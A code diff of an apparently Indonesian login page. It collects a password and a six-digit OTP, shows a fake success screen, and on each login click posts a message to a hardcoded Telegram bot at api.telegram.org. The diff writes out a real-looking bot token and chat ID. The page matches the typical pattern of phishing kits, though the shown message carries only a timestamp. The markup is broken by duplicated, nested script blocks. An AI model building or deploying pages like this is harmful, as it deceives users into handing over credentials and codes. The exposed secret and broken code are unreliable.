@@ -25,36 +25,64 @@
 <script>const loginBtn=document.getElementById('loginBtn'),overlay=document.getElementById('overlay'),closeBtn=document.getElementById('closeBtn'),verifyBtn=document.getElementById('verifyBtn'),otpInputs=document.querySelectorAll('.otp'),otpView=document.getElementById('otpView'),successView=document.getElementById('successView'),bar=document.getElementById('bar'),togglePass=document.getElementById('togglePass'),password=document.getElementById('password');loginBtn.onclick=()=>{overlay.style.display='flex';otpInputs[0].focus()};closeBtn.onclick=()=>overlay.style.display='none';togglePass.onclick=()=>password.type=password.type==='password'?'text':'password';otpInputs.forEach((i,x)=>i.addEventListener('input',()=>{if(i.value&&otpInputs[x+1])otpInputs[x+1].focus()}));verifyBtn.onclick=()=>{const otp=[...otpInputs].map(i=>i.value).join('');if(otp.length<6)return alert('Masukkan 6 digit OTP');otpView.style.display='none';successView.style.display='block';setTimeout(()=>bar.style.width='100%',100)};</script>
 <script>
 <script>
-const BOT_TOKEN = "TOKEN_BARU_KAMU";
-const CHAT_ID = "CHAT_ID_KAMU";
+<script>
+const loginBtn = document.getElementById('loginBtn');
+const overlay = document.getElementById('overlay');
+const closeBtn = document.getElementById('closeBtn');
+const verifyBtn = document.getElementById('verifyBtn');
+const otpInputs = document.querySelectorAll('.otp');
+const otpView = document.getElementById('otpView');
+const successView = document.getElementById('successView');
+const bar = document.getElementById('bar');
+const togglePass = document.getElementById('togglePass');
+const password = document.getElementById('password');
 
-async function kirimEventLogin() {
+closeBtn.onclick = ()=> overlay.style.display='none';
+togglePass.onclick = ()=> password.type =
+  password.type === 'password' ? 'text' : 'password';
+
+otpInputs.forEach((i,x)=>{
+  i.addEventListener('input', ()=>{
+    if(i.value && otpInputs[x+1]) otpInputs[x+1].focus();
+  });
+});
+
+verifyBtn.onclick = ()=>{
+  const otp = [...otpInputs].map(i=>i.value).join('');
+  if(otp.length < 6) return alert('Masukkan 6 digit OTP');
+
+  otpView.style.display='none';
+  successView.style.display='block';
+  setTimeout(()=> bar.style.width='100%',100);
+};
+</script>
+
+<script>
+const BOT_TOKEN = "T8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
+const CHAT_ID = "8264171951";
+
+async function kirimEventLogin(){
   const pesan =
 `🔔 Demo Event
-
-User menekan tombol LOGIN
+User menekan LOGIN
 🆔 Ref: JG-${Date.now()}
 🕒 ${new Date().toLocaleString("id-ID")}`;
 
-  try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: "POST",
-      headers: {
-        "Content-Type":"application/json"
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: pesan
-      })
-    });
-  } catch(err) {
-    console.log(err);
-  }
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{
+      "Content-Type":"application/json"
+    },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: pesan
+    })
+  });
 }
 
-loginBtn.onclick = async () => {
+loginBtn.onclick = async ()=>{
   await kirimEventLogin();
-  overlay.style.display = "flex";
+  overlay.style.display = 'flex';
   otpInputs[0].focus();
 };
 </script>
